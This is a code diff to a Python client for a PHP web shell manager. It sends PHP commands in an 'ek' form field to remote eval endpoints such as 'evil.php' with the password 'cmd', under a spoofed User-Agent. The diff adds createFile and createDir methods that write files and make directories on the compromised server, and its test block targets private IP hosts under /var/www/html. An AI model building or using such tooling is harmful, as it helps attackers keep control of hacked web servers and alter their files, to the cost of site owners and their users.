@@ -1,5 +1,5 @@
 import requests
-from nife.core.phpCodeFun import getFilelistBase, getFilePathBase, getFile, deleteFile, uploadFile, changeName
+from nife.core.phpCodeFun import getFilelistBase, getFilePathBase, getFile, deleteFile, uploadFile, changeName, createFile, createDir
 from nife.core.fakeUseAgent import fake_agent
 import json
 import os
@@ -120,6 +120,39 @@ class SendCode(object):
         val = page.xpath('//ek/text()')[0]
         return val
 
+    def createFile(self, path, content):
+        """
+        新建文件
+        :param path:
+        :param content:
+        :return:
+        """
+        self.data['ek'] = createFile(path=path, content=content)
+        header = {
+            "User-Agent": fake_agent()
+        }
+        # res = self.r.post(url=self.url, data=self.data, headers=header, proxies={"http": '127.0.0.1:8081'})
+        res = self.r.post(url=self.url, data=self.data, headers=header)
+        page = etree.HTML(res.text)
+        val = page.xpath('//ek/text()')[0]
+        return val
+
+    def createDir(self, path):
+        """
+        新建路径
+        :param path:
+        :return:
+        """
+        self.data['ek'] = createDir(path=path)
+        header = {
+            "User-Agent": fake_agent()
+        }
+        res = self.r.post(url=self.url, data=self.data, headers=header)
+        page = etree.HTML(res.text)
+        val = page.xpath('//ek/text()')[0]
+        return val
+
+
 
 if __name__ == '__main__':
     # s = SendCode("http://172.28.100.13/PhpstormProjects/Cnife/eval_fun.php", 'cmd')
@@ -127,6 +160,6 @@ if __name__ == '__main__':
     # path = s.deleteFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/121/")
     # print(path)s = SendCode("http://172.28.100.84/evil.php", 'cmd')
     s = SendCode("http://172.28.100.85:8080/e.php", 'cmd')
-    path = s.renameFile(path='/var/www/html/asdadasd/123.txt', newnamepath="/var/www/html/asdadasd/321.txt")
+    path = s.createDir(path='/var/www/html/asdadasd/888/')
     print(path)
 
